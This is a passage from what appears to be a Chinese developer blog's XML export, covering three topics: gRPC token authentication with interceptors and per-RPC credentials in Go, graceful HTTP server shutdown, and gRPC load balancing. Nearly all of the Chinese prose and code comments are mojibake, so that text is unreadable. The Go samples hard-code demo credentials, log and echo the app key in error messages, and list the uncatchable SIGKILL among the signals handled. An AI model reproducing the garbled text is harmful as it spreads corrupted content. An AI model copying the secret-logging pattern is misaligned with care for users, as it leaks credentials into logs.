æ‹¦æˆªå™¨çš„è´£ä»»å°±æ˜¯å®Œæˆè‡ªå·±çš„é€»è¾‘åè°ƒç”¨è¯¥handler, è®©è¯·æ±‚ç»§ç»­RPCçš„å·¥ä½œ type UnaryClientInterceptor func(ctx context.Context, method string, req, reply interface&#123;&#125;, cc *ClientConn, invoker UnaryInvoker, opts ...CallOption) error// UnaryServerInterceptor æä¾›äº†ä¸€ä¸ªåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œunary RPCçš„é’©å­, // info åŒ…å«æ‹¦æˆªå™¨å¯ä»¥æ“ä½œçš„RPCçš„æ‰€æœ‰ä¿¡æ¯ã€‚// handler æ˜¯æœåŠ¡æ–¹æ³•å®ç°çš„ä¸€ä¸ªåŒ…è£…å™¨, è€Œæ‹¦æˆªå™¨çš„è´£ä»»å°±æ˜¯è°ƒç”¨è¯¥handlerå®ŒæˆRPC, è®©è¯·æ±‚ç»§ç»­RPCçš„å·¥ä½œtype UnaryServerInterceptor func(ctx context.Context, req interface&#123;&#125;, info *UnaryServerInfo, handler UnaryHandler) (resp interface&#123;&#125;, err error) å› æ­¤æˆ‘ä»¬æƒ³è¦åœ¨æœåŠ¡ç«¯å®ç°è¯·æ±‚çš„è®¤è¯åŠŸèƒ½, ä»…éœ€è¦å®ç°ä¸€ä¸ªè‡ªå·±çš„UnaryServerInterceptorå‡½æ•°, å¹¶ä¸”åœ¨serverå¯åŠ¨æ—¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒå³å¯ æ€»ä½“éœ€è¦3æ­¥: è‡ªå®šä¹‰authå‡½æ•°,å®ç°è®¤è¯é€»è¾‘ å®šä¹‰ä¸€ä¸ªä½¿ç”¨è‡ªå®šä¹‰è®¤è¯(auth)çš„æ‹¦æˆªå™¨ serverå¯åŠ¨æ—¶éšå‚æ•°ä¼ å…¥ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100package mainimport ( "net" pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/codes" // grpc å“åº”çŠ¶æ€ç  "google.golang.org/grpc/credentials" // grpcè®¤è¯åŒ… "google.golang.org/grpc/grpclog" "google.golang.org/grpc/metadata" // grpc metadataåŒ…)const ( // Address gRPCæœåŠ¡åœ°å€ Address = "127.0.0.1:50052")// å®šä¹‰helloServiceå¹¶å®ç°çº¦å®šçš„æ¥å£type helloService struct&#123;&#125;// HelloService ...var HelloService = helloService&#123;&#125;func (h helloService) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloResponse, error) &#123; resp := new(pb.HelloResponse) resp.Message = "Hello " + in.Name + "." return resp, nil&#125;// auth éªŒè¯Tokenfunc auth(ctx context.Context) error &#123; md, ok := metadata.FromContext(ctx) if !ok &#123; return grpc.Errorf(codes.Unauthenticated, "æ— Tokenè®¤è¯ä¿¡æ¯") &#125; var ( appid string appkey string ) if val, ok := md["appid"]; ok &#123; appid = val[0] &#125; if val, ok := md["appkey"]; ok &#123; appkey = val[0] &#125; grpclog.Printf("appid: %s, appkey: %s\n", appid, appkey) if appid != "101010" || appkey != "i am key" &#123; return grpc.Errorf(codes.Unauthenticated, "Tokenè®¤è¯ä¿¡æ¯æ— æ•ˆ: appid=%s, appkey=%s", appid, appkey) &#125; return nil&#125;func main() &#123; listen, err := net.Listen("tcp", Address) if err != nil &#123; grpclog.Fatalf("Failed to listen: %v", err) &#125; var opts []grpc.ServerOption // TLSè®¤è¯ creds, err := credentials.NewServerTLSFromFile("../keys/server1.pem", "../keys/server1.key") if err != nil &#123; grpclog.Fatalf("Failed to generate credentials %v", err) &#125; opts = append(opts, grpc.Creds(creds)) // æ³¨å†Œinterceptor var interceptor grpc.UnaryServerInterceptor interceptor = func(ctx context.Context, req interface&#123;&#125;, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (resp interface&#123;&#125;, err error) &#123; err = auth(ctx) if err != nil &#123; return &#125; // ç»§ç»­å¤„ç†è¯·æ±‚ return handler(ctx, req) &#125; opts = append(opts, grpc.UnaryInterceptor(interceptor)) // å®ä¾‹åŒ–grpc Server s := grpc.NewServer(opts...) // æ³¨å†ŒHelloService pb.RegisterHelloServer(s, HelloService) grpclog.Println("Listen on " + Address + " with TLS + Token + Interceptor") s.Serve(listen)&#125; å®¢æˆ·ç«¯æºå¸¦tokenè€Œè‡³äºå®¢æˆ·ç«¯å¦‚ä½•åœ¨æ¯æ¬¡è°ƒç”¨æ—¶éƒ½ä¼ é€’è‡ªå·±çš„tokenä¿¡æ¯, æœ‰æ¯”å®¢æˆ·ç«¯æ‹¦æˆªå™¨æ›´æ–¹ä¾¿çš„æ–¹å¼, å› ä¸ºcredentialsä¸­æœ‰æä¾›è¿™æ ·çš„æ¥å£è¿™éƒ¨åˆ†ä»£ç åœ¨credentials.goä¸­1234567891011// PerRPCCredentials ä¸ºè®¤è¯å®šä¹‰äº†ä¸€ä¸ªé€šç”¨æ¥å£, æ¯æ¬¡RPCè°ƒç”¨éƒ½éœ€è¦æä¾›å®‰å…¨ä¿¡æ¯(æ¯”å¦‚oauth2çš„token)type PerRPCCredentials interface &#123; // GetRequestMetadata è·å–å½“å‰è¯·æ±‚çš„å…ƒæ•°æ®, å¦‚æœéœ€è¦å¯ä»¥åˆ·æ–°tokens. // è¯¥æ–¹æ³•åœ¨è¯·æ±‚è¢«ä¼ è¾“ä¹‹å‰è°ƒç”¨, è€Œæ•°æ®éœ€è¦æ”¾åœ¨headeré‡Œé¢æˆ–è€…å…¶ä»–contextä¸­. // uriä»£è¡¨è¯·æ±‚æ¡ç›®çš„URI // åœ¨åº•å±‚å®ç°çš„æ”¯æŒä¸‹, ctxå¯ä»¥ç”¨äºè¶…æ—¶å’Œå–æ¶ˆ // TODO: å®šä¹‰é™å®šé”®çš„é›†åˆï¼Œè€Œä¸æ˜¯å°†å…¶ä¿ç•™ä¸ºä»»æ„å­—ç¬¦ä¸²ã€‚ GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) // RequireTransportSecurity è¡¨æ˜è®¤è¯è¿‡ç¨‹æ˜¯å¦éœ€è¦å®‰å…¨ä¼ è¾“(æ˜¯å¦å¼€å¯TLS) RequireTransportSecurity() bool&#125; å› æ­¤å¯ä»¥çœ‹å‡ºæˆ‘ä»¬ä»…éœ€è¦å®ç°GetRequestMetadataå’ŒRequireTransportSecurityå³å¯, é€šè¿‡GetRequestMetadataæ–¹æ³•å°†éœ€è¦çš„tokenä¼ é€’ç»™å®¢æˆ·ç«¯å³å¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport ( pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/credentials" // å¼•å…¥grpcè®¤è¯åŒ… "google.golang.org/grpc/grpclog")const ( // Address gRPCæœåŠ¡åœ°å€ Address = "127.0.0.1:50052" // OpenTLS æ˜¯å¦å¼€å¯TLSè®¤è¯ OpenTLS = true)// customCredential è‡ªå®šä¹‰è®¤è¯type customCredential struct&#123;&#125;func (c customCredential) GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) &#123; return map[string]string&#123; "appid": "101010", "appkey": "i am key", &#125;, nil&#125;func (c customCredential) RequireTransportSecurity() bool &#123; if OpenTLS &#123; return true &#125; return false&#125;func main() &#123; var err error var opts []grpc.DialOption if OpenTLS &#123; // TLSè¿æ¥ creds, err := credentials.NewClientTLSFromFile("../keys/cacert.pem", "server1") if err != nil &#123; grpclog.Fatalf("Failed to create TLS credentials %v", err) &#125; opts = append(opts, grpc.WithTransportCredentials(creds)) &#125; else &#123; opts = append(opts, grpc.WithInsecure()) &#125; // æŒ‡å®šè‡ªå®šä¹‰è®¤è¯ opts = append(opts, grpc.WithPerRPCCredentials(new(customCredential))) conn, err := grpc.Dial(Address, opts...) if err != nil &#123; grpclog.Fatalln(err) &#125; defer conn.Close() // åˆå§‹åŒ–å®¢æˆ·ç«¯ c := pb.NewHelloClient(conn) // è°ƒç”¨æ–¹æ³• reqBody := new(pb.HelloRequest) reqBody.Name = "gRPC" r, err := c.SayHello(context.Background(), reqBody) if err != nil &#123; grpclog.Fatalln(err) &#125; grpclog.Println(r.Message)&#125; æµ‹è¯•é’ˆå¯¹ä»¥ä¸ŠåŠŸèƒ½åšæµ‹è¯• æ­£å¸¸æµ‹è¯•å¸¦è¯ä¹¦å’Œåˆæ³•tokençš„è¯·æ±‚123$go run main.go2017/08/08 10:36:10 Listen on 127.0.0.1:50052 with TLS + Token + Interceptor2017/08/08 10:36:13 appid: 101010, appkey: i am key è¯·æ±‚æˆåŠŸ12$go run main.go2017/08/08 10:36:13 Hello gRPC. å¼‚å¸¸æµ‹è¯•ä¸å¸¦è¯ä¹¦çš„è¯·æ±‚123$go run main.go2017/08/08 11:05:36 Listen on 127.0.0.1:50052 with TLS + Token + Interceptor2017/08/08 11:05:38 grpc: Server.Serve failed to complete security handshake from "127.0.0.1:56310": tls: first record does not look like a TLS handshake è¯·æ±‚å¤±è´¥1234$go run main.go2017/08/08 11:05:38 transport: http2Client.notifyError got notified that the client transport was broken unexpected EOF.2017/08/08 11:05:38 rpc error: code = Internal desc = transport is closingexit status 1 å¸¦è¯ä¹¦ä½†tokenä¸åˆæ³•123$go run main.go2017/08/08 11:08:36 rpc error: code = Unauthenticated desc = Tokenè®¤è¯ä¿¡æ¯æ— æ•ˆ: appid=101010, appkey=i am key1exit status 1]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>APIGateway</tag>
        <tag>gRPC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang HTTPæœåŠ¡ä¼˜é›…é‡å¯]]></title>
    <url>%2F2017%2F08%2F06%2Fhttp-graceful%2F</url>
    <content type="text"><![CDATA[RESTful API Gatewayæ˜¯ä¸€ä¸ªé«˜ç¨³å®šæ€§çš„ç»„ä»¶, å› æ­¤éœ€è¦æœ‰åƒNginx Reloadé‚£æ ·å¹³æ»‘å‡çº§çš„èƒ½åŠ›, å³å…³é—­æ­£åœ¨è¿è¡Œçš„è€ç¨‹åºï¼Œå¹¶å¯åŠ¨æ–°ç¨‹åºã€‚ æ ‡å‡†åº“çš„çš„å®ç°Goåœ¨1.8å¯¹net/httpè¿›è¡Œäº†æ›´æ–°, æä¾›äº†httpæœåŠ¡ä¼˜é›…å…³é—­çš„èƒ½åŠ›ã€‚ å®˜æ–¹è¯´æ˜æˆ‘ä»¬çœ‹ä¸‹server.goä¸­å…³äºColseæ–¹æ³•çš„æè¿°:1234567891011121314// Closeå°†ä¼šç«‹å³å…³é—­æ‰€æœ‰æ´»è·ƒçš„ç›‘å¬å™¨ä»¥åŠæ‰€æœ‰è¿æ¥,æ¯”å¦‚æ–°è¿æ¥,æ´»è·ƒè¿æ¥, ç©ºé—²è¿æ¥// å¦‚æœæƒ³ä¼˜é›…å…³é—­æœåŠ¡, è¯·ä½¿ç”¨Shutdown// æ³¨æ„closeå¹¶ä¸å°è¯•å…³é—­æˆ–è€…ç­‰å¾…hijackedè¿æ¥ï¼Œå¦‚WebSocketsfunc (srv *Server) Close() error &#123; srv.mu.Lock() defer srv.mu.Unlock() srv.closeDoneChanLocked() err := srv.closeListenersLocked() for c := range srv.activeConn &#123; c.rwc.Close() delete(srv.activeConn, c) &#125; return err&#125; å¯¹æ¯”closeæ–¹æ³•, æˆ‘ä»¬çœ‹ä¸‹Shutdownåˆ°åº•å¤šåšäº†ä»€ä¹ˆå·¥ä½œ:12345678910111213141516171819202122232425262728293031323334353637// Shutdownä¼šå¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨,å®šæœŸå·¡æ£€é‚£äº›ç©ºé—²è¿æ¥, ç„¶åæŠŠè¿™äº›ç©ºé—²è¿æ¥å…³é—­// è€Œè¿™ä¸ªå·¡æ£€æ—¶é—´å°±æ˜¯shutdownPollInterval, å¯ä»¥çœ‹å‡ºé»˜è®¤ä¸º500æ¯«ç§’// // æˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸æ¶‰åŠæŠ•ç¥¨çš„æœ€ç†æƒ³è§£å†³æ–¹æ¡ˆï¼ŒåŒæ—¶å®ƒçš„æ¶ˆè€—ä¹Ÿå¾ˆå°‘(ä¸æ¶‰åŠä»»ä½•äº’æ–¥é”),// ä½†æ˜¯æ˜¯ç•™ç»™è¯»è€…ä½œä¸ºç»ƒä¹ ã€‚var shutdownPollInterval = 500 * time.Millisecond// Shutdown å°†æ— ä¸­æ–­çš„å…³é—­æ­£åœ¨æ´»è·ƒçš„è¿æ¥ï¼Œç„¶åå¹³æ»‘çš„åœæ­¢æœåŠ¡ã€‚å¤„ç†æµç¨‹å¦‚ä¸‹:// 1) é¦–å…ˆå…³é—­æ‰€æœ‰çš„ç›‘å¬// 2) ç„¶åå…³é—­æ‰€æœ‰çš„ç©ºé—²è¿æ¥// 3) ç„¶åæ— é™æœŸç­‰å¾…è¿æ¥å¤„ç†å®Œæ¯•è½¬ä¸ºç©ºé—²ï¼Œå¹¶å…³é—­// 4) å¦‚æœæä¾›äº† å¸¦æœ‰è¶…æ—¶çš„Contextï¼Œå°†åœ¨æœåŠ¡å…³é—­å‰è¿”å› Contextçš„è¶…æ—¶é”™è¯¯// // Shutdown å¹¶ä¸å°è¯•å…³é—­æˆ–è€…ç­‰å¾… hijackedè¿æ¥ï¼Œ// å¦‚ WebSocketsã€‚å¦‚æœéœ€è¦çš„è¯è°ƒç”¨è€…éœ€è¦åˆ†åˆ«å¤„ç†è¯¸å¦‚é•¿è¿æ¥ç±»å‹çš„ç­‰å¾…å’Œå…³é—­ã€‚func (srv *Server) Shutdown(ctx context.Context) error &#123; atomic.AddInt32(&amp;srv.inShutdown, 1) defer atomic.AddInt32(&amp;srv.inShutdown, -1) srv.mu.Lock() lnerr := srv.closeListenersLocked() srv.closeDoneChanLocked() srv.mu.Unlock() ticker := time.NewTicker(shutdownPollInterval) defer ticker.Stop() for &#123; if srv.closeIdleConns() &#123; return lnerr &#125; select &#123; case &lt;-ctx.Done(): return ctx.Err() case &lt;-ticker.C: &#125; &#125;&#125; ç®€å•æ ·ä¾‹æ ¹æ®ä¸Šé¢çš„åˆ†æ, æˆ‘ä»¬å†™ä¸€ä¸ªç®€å•çš„æ —å­è¿›è¡Œæµ‹è¯•(Githubåœ°å€: HTTP Graceful)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( "context" "fmt" "log" "net/http" "os" "os/signal" "syscall" "time")func main() &#123; http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) &#123; // for test active connection time.Sleep(time.Second * 2) fmt.Fprintf(w, "Hello World, %v\n", time.Now()) &#125;) s := &amp;http.Server&#123; Addr: ":8080", Handler: http.DefaultServeMux, ReadTimeout: 10 * time.Second, WriteTimeout: 10 * time.Second, MaxHeaderBytes: 1 &lt;&lt; 20, &#125; go func() &#123; log.Printf("server start at: 127.0.0.1:8080") log.Println(s.ListenAndServe()) log.Println("server shutdown") &#125;() // Handle SIGINT, SIGTERM, SIGKILL, SIGHUP, SIGQUIT ch := make(chan os.Signal) signal.Notify(ch, syscall.SIGTERM, syscall.SIGINT, syscall.SIGKILL, syscall.SIGHUP, syscall.SIGQUIT) log.Println(&lt;-ch) // Stop the service gracefully. ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second) defer cancel() log.Println(s.Shutdown(ctx)) // Wait gorotine print shutdown message time.Sleep(time.Second * 10) log.Println("done.")&#125; æµ‹è¯•å¯åŠ¨æœåŠ¡ç«¯, å¹¶å…³æ³¨æ—¥å¿—:1234567$go run main.go2017/08/06 16:06:47 server start at: 127.0.0.1:8080^C2017/08/06 16:07:10 interrupt2017/08/06 16:07:10 http: Server closed2017/08/06 16:07:10 server shutdown2017/08/06 16:07:11 &lt;nil&gt;2017/08/06 16:07:21 done. ä½¿ç”¨curlå‘èµ·ä¸€æ¬¡è¯·æ±‚, åœ¨è¯·æ±‚ä¸ºç»“æŸå‰å…³é—­æœåŠ¡1234$curl localhost:8080Hello World, 2017-08-06 16:07:11.341038687 +0800 CST$curl localhost:8080curl: (7) Failed to connect to localhost port 8080: Connection refused ä»æµ‹è¯•ç»“æœå¯ä»¥çœ‹å‡º: æ­£åœ¨è¿›è¡Œè®¿é—®çš„è¯·æ±‚ä¸ä¼šè¢«å…³é—­, ç»§ç»­æ­£å¸¸å“åº” æ–°å¢çš„è¯·æ±‚åˆ™æ‹’ç»è®¿é—® å› æ­¤HTTPçš„Shutdownçš„ç¡®å¯ä»¥èµ·åˆ°ä¼˜é›…å…³é—­æœåŠ¡çš„ä½œç”¨ã€‚ ç¬¬ä¸‰æ–¹å®ç°å®˜æ–¹ä»…ä»…å®ç°äº†ä¼˜é›…çš„å…³é—­, å¹¶æ²¡æœ‰å®ç°ä¼˜é›…é‡å¯, æƒ³è¦å®ç°åƒNginxé‚£æ ·ä¼˜é›…é‡å¯, è¿˜æœ‰å¾ˆå¤šå·¥ä½œè¦åš, æœ‰ä¸ªä¸é”™çš„ç¬¬ä¸‰æ–¹åº“å·²ç»å®ç°äº†è¯¥èƒ½åŠ›, ä»£ç†è´¨é‡ä¹Ÿä¸é”™, å€¼å¾—ä½¿ç”¨å…·ä½“å¯ä»¥å‚è€ƒGolangå¼€å‘æ”¯æŒå¹³æ»‘å‡çº§ï¼ˆä¼˜é›…é‡å¯ï¼‰çš„HTTPæœåŠ¡]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gRPCæœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡]]></title>
    <url>%2F2017%2F08%2F02%2Fapi-gateway-service-discovery-and-lb%2F</url>
    <content type="text"><![CDATA[APIç½‘å…³éœ€è¦å®ç°æœåŠ¡çš„è‡ªåŠ¨å‘ç°å’Œè´Ÿè½½å‡è¡¡, ç”±äºåé¢çš„æœåŠ¡åŸºæœ¬éƒ½é‡‡ç”¨gRPCå®ç°, å› æ­¤éœ€è¦éªŒè¯gRPCå¦‚ä½•å®ç°è¿™2ä¸ªåŠŸèƒ½ã€‚ æ¦‚è¿°æ„å»ºé«˜å¯ç”¨ã€é«˜æ€§èƒ½çš„é€šä¿¡æœåŠ¡ï¼Œé€šå¸¸é‡‡ç”¨æœåŠ¡æ³¨å†Œä¸å‘ç°ã€è´Ÿè½½å‡è¡¡å’Œå®¹é”™å¤„ç†ç­‰æœºåˆ¶å®ç°ã€‚gRPCåœ¨è®¾è®¡æ—¶å·²æœ‰è€ƒè™‘, å®˜æ–¹ä¹Ÿæä¾›äº†ä¸€äº›åŸºæœ¬å®ç°, ä½†æ˜¯å¦‚ä½•å›´ç»•å®˜æ–¹è®¾è®¡å®ç°æœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡å´å¹¶ä¸å®¹æ˜“, æˆ‘ä¼šå›´ç»•ä»¥ä¸‹å‡ ç‚¹è¿›è¡Œå±•å¼€: è§£è¯»å®˜æ–¹æ–‡æ¡£: Load Balancing in gRPC è´Ÿè½½å‡è¡¡éƒ¨åˆ†æºç è§£è¯» ä»£ç å®ç°,å‚è€ƒwonaming å®˜æ–¹è®¾è®¡å®˜æ–¹è¿™ç¯‡æ–‡æ¡£ä¸»è¦æ˜¯é˜è¿°å¦‚ä½•åˆ©ç”¨gRPCè®¾è®¡è´Ÿè½½å‡è¡¡ã€‚ èƒŒæ™¯å€¼å¾—æ³¨æ„çš„æ˜¯gGRCçš„è´Ÿè½½å‡è¡¡æ˜¯ä»¥callä¸ºåŸºç¡€, è€Œä¸æ˜¯ä»¥è¿æ¥ä¸ºåŸºç¡€, ä¹Ÿå°±æ˜¯è¯´åŒä¸€ä¸ªå®¢æˆ·ç«¯çš„ä¸åŒè¯·æ±‚ ä¼šè¢«åˆ†æ‘Šåˆ°åé¢è¯¥æœåŠ¡çš„é›†ç¾¤ä¸Šé¢ã€‚ è´Ÿè½½å‡è¡¡çš„æ–¹æ³•åœ¨è®¨è®ºä»»ä½•gRPCçš„ç»†èŠ‚ä¹‹å‰, å…ˆè®¤è¯†ä¸‹å¸¸ç”¨è´Ÿè½½å‡è¡¡çš„æ–¹æ³•: ä»£ç†æ¨¡å¼(Proxy Model)ä»£ç†æ¨¡å¼çš„è´Ÿè½½å‡è¡¡æœºåˆ¶ä½äºæœåŠ¡å¤–éƒ¨, å€ŸåŠ©å…¶ä»–å·¥å…·å®ç°ã€‚å®ƒä¸€èˆ¬ä½äºæ¶ˆè´¹è€…å’ŒæœåŠ¡æä¾›è€…ä¹‹é—´, æ¯”å¦‚ä¸“é—¨çš„ç¡¬ä»¶è®¾å¤‡F5, æˆ–è€…è½¯ä»¶HAProxy,Nginxç­‰, LBä¸Šæœ‰æ‰€æœ‰æœåŠ¡çš„åœ°å€æ˜ å°„è¡¨ï¼Œé€šå¸¸ç”±è¿ç»´é…ç½®æ³¨å†Œï¼Œå½“æœåŠ¡æ¶ˆè´¹æ–¹è°ƒç”¨æŸä¸ªç›®æ ‡æœåŠ¡æ—¶ï¼Œå®ƒå‘LBå‘èµ·è¯·æ±‚ï¼Œç”±LBä»¥æŸç§ç­–ç•¥ï¼Œæ¯”å¦‚è½®è¯¢(Round-Robin)åšè´Ÿè½½å‡è¡¡åå°†è¯·æ±‚è½¬å‘åˆ°ç›®æ ‡æœåŠ¡ã€‚LBä¸€èˆ¬å…·å¤‡å¥åº·æ£€æŸ¥èƒ½åŠ›ï¼Œèƒ½è‡ªåŠ¨æ‘˜é™¤ä¸å¥åº·çš„æœåŠ¡å®ä¾‹ã€‚è¯¥æ–¹æ¡ˆçš„é—®é¢˜: é…ç½®ä¸æ–¹ä¾¿: åŸºæœ¬éƒ½ä½¿ç”¨é…ç½®æ–‡ä»¶æˆ–è€…UIçš„æ–¹å¼æ“ä½œ, å¹¶æ²¡æœ‰å‹å¥½çš„APIè°ƒç”¨, ä¸æ–¹ä¾¿é›†æˆ æ‰©å±•æ€§: é¢„ç•™çš„æ‰©å±•ç©ºé—´ä¸è¶³, ä¸èƒ½å¾ˆå¥½çš„æ ¹æ®è‡ªå·±çš„éœ€æ±‚æ‰©å±•åŠŸèƒ½, ä½†Nginxé™¤å¤– æ€§èƒ½æŸè€—: ç”±äºéœ€è¦å¤åˆ¶è¯·æ±‚å’Œå“åº”, ä¼šæœ‰ä¸€å®šçš„æ€§èƒ½æŸè€—, å¯¹äºå­˜å‚¨è¿™ç§é‡æœåŠ¡å°±ä¸é€‚ç”¨äº† åŸºäºå®¢æˆ·ç«¯æ¨¡å¼(Balancing-aware Client)é’ˆå¯¹ç¬¬ä¸€ä¸ªæ–¹æ¡ˆçš„ä¸è¶³ï¼Œæ­¤æ–¹æ¡ˆå°†LBçš„åŠŸèƒ½é›†æˆåˆ°æœåŠ¡æ¶ˆè´¹æ–¹è¿›ç¨‹é‡Œï¼Œä¹Ÿè¢«ç§°ä¸ºè½¯è´Ÿè½½æˆ–è€…å®¢æˆ·ç«¯è´Ÿè½½æ–¹æ¡ˆ, å› æ­¤å®¢æˆ·ç«¯ä¼šç•¥ç°é‡ä¸€äº›, æ¯”å¦‚å®¢æˆ·ç«¯ä¼šåŒ…å«å¾ˆå¤šè°ƒåº¦ç­–ç•¥(Round Robin, Random, etc)ç”¨äºä»serveråˆ—è¡¨ä¸­æŒ‘é€‰åˆé€‚çš„serverè¿›è¡Œè°ƒåº¦ã€‚ åœ¨è¿™ç§æ¨¡å¼ä¸‹, æœåŠ¡å™¨åˆ—è¡¨å°†åœ¨å®¢æˆ·ç«¯ä¸­é™æ€é…ç½®, ç”±åç§°è§£æç³»ç»Ÿå’Œå¤–éƒ¨è´Ÿè½½å‡è¡¡å™¨æä¾›, åœ¨ä»»ä½•æƒ…å†µä¸‹, å®¢æˆ·ç«¯è´Ÿè´£ä»åˆ—è¡¨ä¸­é€‰å–æœ€åˆé€‚çš„serverè¿›è¡Œè°ƒåº¦ã€‚å…·ä½“çš„å®ç°è¿‡ç¨‹å¦‚ä¸‹: æœåŠ¡æä¾›æ–¹å¯åŠ¨æ—¶ï¼Œé¦–å…ˆå°†æœåŠ¡åœ°å€æ³¨å†Œåˆ°æœåŠ¡æ³¨å†Œè¡¨ï¼ŒåŒæ—¶å®šæœŸæŠ¥å¿ƒè·³åˆ°æœåŠ¡æ³¨å†Œè¡¨ä»¥è¡¨æ˜æœåŠ¡çš„å­˜æ´»çŠ¶æ€ï¼Œç›¸å½“äºå¥åº·æ£€æŸ¥ æœåŠ¡æ¶ˆè´¹æ–¹è¦è®¿é—®æŸä¸ªæœåŠ¡æ—¶ï¼Œå®ƒé€šè¿‡å†…ç½®çš„LBç»„ä»¶å‘æœåŠ¡æ³¨å†Œè¡¨æŸ¥è¯¢ï¼ŒåŒæ—¶ç¼“å­˜å¹¶å®šæœŸåˆ·æ–°ç›®æ ‡æœåŠ¡åœ°å€åˆ—è¡¨ï¼Œç„¶åä»¥æŸç§è´Ÿè½½å‡è¡¡ç­–ç•¥é€‰æ‹©ä¸€ä¸ªç›®æ ‡æœåŠ¡åœ°å€ï¼Œæœ€åå‘ç›®æ ‡æœåŠ¡å‘èµ·è¯·æ±‚ã€‚LBå’ŒæœåŠ¡å‘ç°èƒ½åŠ›è¢«åˆ†æ•£åˆ°æ¯ä¸€ä¸ªæœåŠ¡æ¶ˆè´¹è€…çš„è¿›ç¨‹å†…éƒ¨ï¼ŒåŒæ—¶æœåŠ¡æ¶ˆè´¹æ–¹å’ŒæœåŠ¡æä¾›æ–¹ä¹‹é—´æ˜¯ç›´æ¥è°ƒç”¨ï¼Œæ²¡æœ‰é¢å¤–å¼€é”€ï¼Œæ€§èƒ½æ¯”è¾ƒå¥½ã€‚ è¯¥æ–¹æ¡ˆä¸»è¦é—®é¢˜ï¼š å¼€å‘æˆæœ¬ï¼Œç¼–å†™å’Œç»´æŠ¤å¤šç§è¯­è¨€æˆ–å®¢æˆ·ç«¯çš„è´Ÿè½½å‡è¡¡ç­–ç•¥, ä¼šæœ‰å†—ä½™, è€Œä¸”ä¹Ÿå¢åŠ äº†å¼€å‘æˆæœ¬å’Œç»´æŠ¤æˆæœ¬ã€‚ å¢åŠ å®¢æˆ·ç«¯å¤æ‚æ€§ï¼Œè¿™äº›è´Ÿè½½å‡è¡¡ç­–ç•¥ æœ‰å¯èƒ½è¿˜éœ€è¦å’ŒæœåŠ¡ç«¯è¿›è¡Œä¸€äº›é¢å¤–çš„é€šä¿¡, æ¯”å¦‚ç›‘æ§çŠ¶æ€æ£€æŸ¥, è´Ÿè½½ä¿¡æ¯, å®ƒå°†ä½¿å¾—å®¢æˆ·ç«¯ä»£ç å¤æ‚åŒ–ã€‚ å¤–éƒ¨è´Ÿè½½å‡è¡¡å™¨é’ˆå¯¹å®¢æˆ·ç«¯è¿‡é‡çš„é—®é¢˜, æœ‰äº†ç¬¬ä¸‰ç§æ–¹å¼: å¤æ‚çš„è°ƒåº¦ç®—æ³•ç‹¬ç«‹æˆLB, ç”±å¤–éƒ¨æä¾›ã€‚è€Œå®¢æˆ·ç«¯ä¿æŒç®€å•å’Œå¯ç§»æ¤,ä»…å®ç°ä¸€äº›åŸºæœ¬çš„serveræŒ‘é€‰ç®—æ³•æ¯”å¦‚ Round Robin, è€Œå®¢æˆ·ç«¯ä¾èµ–LBæä¾›è´Ÿè½½å‡è¡¡çš„é…ç½®å’Œå®¢æˆ·ç«¯éœ€è¦å‘é€è¯·æ±‚çš„serveråˆ—è¡¨, LBéœ€è¦æ ¹æ®éœ€è¦æ›´æ–°serveråˆ—è¡¨,ä»¥å¹³è¡¡è´Ÿè½½, å¤„ç†serverä¸å¯ç”¨æˆ–è€…å¥åº·é—®é¢˜. æ¶æ„gRPCä¸»è¦é‡‡ç”¨å¤–éƒ¨è´Ÿè½½å‡è¡¡çš„æ–¹å¼, å› gRPCå®ç°äº†ç®€å•æœåŠ¡æŒ‘é€‰ç®—æ³•: Round Robin, åŒæ—¶ä¹Ÿæä¾›äº†ä¸€ç§å¤–éƒ¨LBç®—æ³•çš„å‚è€ƒå®ç°: grpclb, å®˜æ–¹å¹¶ä¸å»ºè®® å†å¾€é‡Œé¢æ·»åŠ æ›´å¤šçš„ç®—å‘, è€Œæ›´å¤šçš„ç®—æ³•éœ€è¦é€šè¿‡å¤–éƒ¨LBæä¾›å®ç°ã€‚ å·¥ä½œæµç¨‹å¤§è‡´å¦‚ä¸‹: æœåŠ¡å¯åŠ¨ågRPCå®¢æˆ·ç«¯å‘å‘½åæœåŠ¡å™¨å‘å‡ºåç§°è§£æè¯·æ±‚ï¼Œåç§°å°†è§£æä¸ºä¸€ä¸ªæˆ–å¤šä¸ªIPåœ°å€ï¼Œæ¯ä¸ªIPåœ°å€æ ‡ç¤ºå®ƒæ˜¯æœåŠ¡å™¨åœ°å€è¿˜æ˜¯è´Ÿè½½å‡è¡¡å™¨åœ°å€ï¼Œä»¥åŠæ ‡ç¤ºè¦ä½¿ç”¨é‚£ä¸ªå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ç­–ç•¥æˆ–æœåŠ¡é…ç½®ã€‚è€Œå®¢æˆ·ç«¯æä¾›çš„è´Ÿè½½å‡è¡¡ç­–ç•¥æœ‰round_robinå’Œgrpclb 